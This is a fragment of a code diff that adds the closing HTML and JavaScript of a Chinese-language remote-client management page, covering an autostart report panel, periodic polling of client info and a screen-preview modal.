+                    <pre id="autostart-report" class="border rounded p-2 bg-white small mb-0" style="white-space: pre-wrap; max-height: 280px; overflow: auto;">（尚未执行）</pre>
+                    <p class="mt-2 mb-0 text-muted small">说明：平台「开机自启」字段在命令下发成功时即更新；下方正文以客户端 <code>command_response</code> 为准。</p>
+                `;
+                break;
+            default:
+                html = '请选择上方功能查看详细说明和操作入口。';
+        }
+        panel.innerHTML = html;
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        loadClientInfo();
+        setInterval(loadClientInfo, 5000);
+        // 默认展示终端功能说明
+        switchFeature('terminal');
+        document.getElementById('screen-preview-modal')?.addEventListener('hidden.bs.modal', function () {
+            const mi = document.getElementById('screen-preview-modal-img');
+            if (mi) mi.removeAttribute('src');
+        });
+    });
+</script>
+</body>
+</html>
